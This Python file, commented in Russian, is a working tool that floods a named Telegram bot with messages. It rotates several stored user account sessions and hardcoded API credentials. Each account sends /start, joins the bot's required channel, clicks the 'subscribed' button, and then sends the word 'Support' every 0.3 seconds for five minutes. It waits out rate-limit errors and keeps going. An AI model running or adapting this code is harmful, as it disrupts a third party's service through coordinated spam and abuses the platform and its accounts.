"""
berlin_stress.py
Стрессер берлин-подобных ботов.
Флоу: /start → я подписался (inline) → спам текстом "Поддержка" с 0.3s задержкой.
"""

import asyncio
import os
import random

from telethon import TelegramClient
from telethon.errors import FloodWaitError, AuthKeyDuplicatedError
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest, SendMessageRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import ReplyInlineMarkup, KeyboardButtonCallback, KeyboardButtonUrl

API = [
    '24565698:5a084b434f8505ace703485b9da85040',
    '27904162:e7cba879b1c643ba77490bf328df5eab',
    '23037915:50f06f5b2223586fde0d1379ea91ebc7',
    '29512095:0b29a7d42fff002856b9bed64f7ec919',
    '25055016:25edf5b7becebe91a2d61fe8d9d9931b',
    '21156147:90408de329b27f7dd411dff3e601acc6',
]

SESSION_DIR  = 'sessions'
TARGET_BOT   = 'berlinsnoserbot'
SPAM_TEXT    = 'Поддержка'
SPAM_DELAY   = 0.3
SPAM_WORKERS = 5
SPAM_MINUTES = 5


def _get_sessions(limit: int = SPAM_WORKERS) -> list[str]:
    sessions = [f.replace('.session', '') for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
    random.shuffle(sessions)
    return sessions[:limit]


def _make_client(session: str) -> TelegramClient:
    api_str = random.choice(API)
    api_id, api_hash = api_str.split(':', 1)
    return TelegramClient(
        f"./{SESSION_DIR}/{session}", int(api_id), api_hash,
        system_version='4.16.30-vxCUSTOM'
    )


async def _prepare_session(session: str) -> TelegramClient | None:
    """
    Подготовка сессии: /start → нажать 'я подписался' → готово к спаму.
    Возвращает подключённый клиент или None при ошибке.
    """
    client = _make_client(session)
    try:
        await asyncio.wait_for(client.connect(), timeout=12)
        if not await client.is_user_authorized():
            print(f"[BERLIN] [{session}] невалид", flush=True)
            await client.disconnect()
            return None

        peer = await client.get_entity(TARGET_BOT)

        # Шаг 1: /start
        await client(SendMessageRequest(peer=peer, message='/start', random_id=random.randint(1, 2**31)))
        await asyncio.sleep(2)

        # Шаг 2: найти кнопку "подписаться на канал" (URL) → вступить → нажать "я подписался"
        msgs = await client.get_messages(peer, limit=5)
        channel_url = None
        subscribed_msg_id = None
        subscribed_btn_data = None

        # Диагностика: выводим что пришло от бота
        for msg in msgs:
            if msg.out:
                continue
            print(f"[BERLIN] [{session}] msg id={msg.id} markup={type(msg.reply_markup).__name__} text={msg.text[:60] if msg.text else ''!r}", flush=True)
            if msg.reply_markup:
                markup = msg.reply_markup
                rows = getattr(markup, 'rows', [])
                for row in rows:
                    for btn in row.buttons:
                        print(f"[BERLIN] [{session}]   btn type={type(btn).__name__} text={getattr(btn,'text','?')!r}", flush=True)

        for msg in msgs:
            if msg.out or not msg.reply_markup:
                continue
            if not isinstance(msg.reply_markup, ReplyInlineMarkup):
                continue
            for row in msg.reply_markup.rows:
                for btn in row.buttons:
                    if isinstance(btn, KeyboardButtonUrl) and channel_url is None:
                        channel_url = btn.url  # ссылка на канал
                    if isinstance(btn, KeyboardButtonCallback) and 'подписал' in btn.text.lower():
                        subscribed_msg_id = msg.id
                        subscribed_btn_data = btn.data

        # Вступаем в канал
        if channel_url:
            try:
                # Извлекаем username или invite hash из URL
                # Поддерживаем форматы: t.me/username, t.me/+HASH, t.me/joinchat/HASH
                import re as _re
                _m = _re.search(r't\.me/(?:joinchat/|\+)?([A-Za-z0-9_\-]+)', channel_url)
                if _m:
                    chan_ref = _m.group(1)
                    if channel_url and ('+' in channel_url or 'joinchat' in channel_url):
                        from telethon.tl.functions.messages import ImportChatInviteRequest
                        await client(ImportChatInviteRequest(hash=chan_ref))
                    else:
                        chan_entity = await client.get_entity(chan_ref)
                        await client(JoinChannelRequest(chan_entity))
                    print(f"[BERLIN] [{session}] ✅ вступил в канал ({chan_ref})", flush=True)
                    await asyncio.sleep(1.5)
            except Exception as e:
                # Уже подписан или ошибка — продолжаем
                print(f"[BERLIN] [{session}] канал: {str(e)[:60]}", flush=True)
        else:
            print(f"[BERLIN] [{session}] URL-кнопки не найдено, продолжаем", flush=True)

        # Нажимаем "я подписался"
        if not subscribed_btn_data:
            # Если не нашли с первого раза — перечитываем
            msgs = await client.get_messages(peer, limit=5)
            for msg in msgs:
                if msg.out or not msg.reply_markup:
                    continue
                if not isinstance(msg.reply_markup, ReplyInlineMarkup):
                    continue
                for row in msg.reply_markup.rows:
                    for btn in row.buttons:
                        if isinstance(btn, KeyboardButtonCallback) and 'подписал' in btn.text.lower():
                            subscribed_msg_id = msg.id
                            subscribed_btn_data = btn.data

        if not subscribed_btn_data:
            print(f"[BERLIN] [{session}] кнопка 'я подписался' не найдена", flush=True)
            await client.disconnect()
            return None

        await client(GetBotCallbackAnswerRequest(peer=peer, msg_id=subscribed_msg_id, data=subscribed_btn_data))
        await asyncio.sleep(1.5)

        await asyncio.sleep(1.5)
        print(f"[BERLIN] [{session}] ✅ подготовлен", flush=True)
        return client

    except AuthKeyDuplicatedError:
        print(f"[BERLIN] [{session}] занят другим процессом", flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        return None
    except Exception as e:
        print(f"[BERLIN] [{session}] ошибка подготовки: {e}", flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        return None


async def _spam_worker(client: TelegramClient, session: str, stop_event: asyncio.Event) -> int:
    """Спамит текстом SPAM_TEXT пока не выйдет время."""
    count = 0
    try:
        peer = await client.get_entity(TARGET_BOT)
        print(f"[BERLIN] [{session}] 🔥 спам запущен", flush=True)

        while not stop_event.is_set():
            try:
                await client(SendMessageRequest(
                    peer=peer,
                    message=SPAM_TEXT,
                    random_id=random.randint(1, 2**31)
                ))
                count += 1
                if count % 50 == 0:
                    print(f"[BERLIN] [{session}] 📊 {count} сообщений", flush=True)
            except FloodWaitError as e:
                print(f"[BERLIN] [{session}] 🌊 flood {e.seconds}s", flush=True)
                await asyncio.sleep(e.seconds)
            except Exception as e:
                print(f"[BERLIN] [{session}] ⚠️ {str(e)[:60]}", flush=True)
                await asyncio.sleep(1)
            await asyncio.sleep(SPAM_DELAY)

    except Exception as e:
        print(f"[BERLIN] [{session}] ❌ воркер упал: {e}", flush=True)
    finally:
        try:
            if client.is_connected():
                await client.disconnect()
        except Exception:
            pass

    print(f"[BERLIN] [{session}] 🏁 итог: {count} сообщений", flush=True)
    return count


async def run_berlin_stress(notify_fn=None, user_id: int = 0) -> bool:
    async def notify(text: str):
        if notify_fn:
            try:
                await notify_fn(text)
            except Exception:
                pass
        print(f"[BERLIN] {text}", flush=True)

    sessions = _get_sessions(SPAM_WORKERS)
    if not sessions:
        await notify("❌ Нет сессий в папке sessions/")
        return False

    await notify(f"🔄 Подготовка {len(sessions)} сессий...")

    # Параллельно готовим все сессии
    prep_tasks = [_prepare_session(s) for s in sessions]
    clients_raw = await asyncio.gather(*prep_tasks, return_exceptions=True)

    ready = [(sessions[i], c) for i, c in enumerate(clients_raw) if isinstance(c, TelegramClient)]

    if not ready:
        await notify("❌ Ни одна сессия не прошла флоу. Проверьте сессии.")
        return False

    await notify(
        f"✅ Готово {len(ready)} из {len(sessions)} сессий\n"
        f"⚡️ Спам *{SPAM_TEXT}* · задержка {SPAM_DELAY}s · {SPAM_MINUTES} мин"
    )

    stop_event = asyncio.Event()
    asyncio.get_event_loop().call_later(SPAM_MINUTES * 60, stop_event.set)

    tasks = [
        asyncio.create_task(_spam_worker(c, s, stop_event))
        for s, c in ready
    ]

    results = await asyncio.gather(*tasks, return_exceptions=True)
    total = sum(r for r in results if isinstance(r, int))

    await notify(
        f"🏁 Готово!\n"
        f"📊 Итого: *{total}* сообщений за {SPAM_MINUTES} мин\n"
        f"👥 Сессий: {len(ready)}"
    )
    return True
